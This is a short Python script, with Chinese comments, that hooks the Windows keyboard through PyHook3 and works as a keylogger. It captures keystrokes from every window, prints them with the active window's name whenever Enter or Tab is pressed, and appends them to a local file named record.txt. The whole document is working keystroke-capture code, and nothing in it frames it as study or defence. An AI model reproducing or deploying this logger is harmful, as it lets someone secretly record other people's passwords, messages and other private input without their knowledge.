import pythoncom,PyHook3
counts = 0
buffer = []
def OnKeyboardEvent(event):
    global counts, buffer
    buffer.append(event.Ascii)
    if event.Ascii == 13 or event.Ascii == 9:
        #       在屏幕上输出
        print('活动窗口:', event.WindowName)
        for i in buffer:
            print(chr(i), end='')
        print('\n')
        #       写入到文件
        f = open('record.txt', 'a+')
        for x in buffer:
            f.write(chr (x))
        f.write('\n')
        f.close()
        buffer = []
# return True to pass the event to other handlers
    return True

# create a hook manager
hm = PyHook3.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()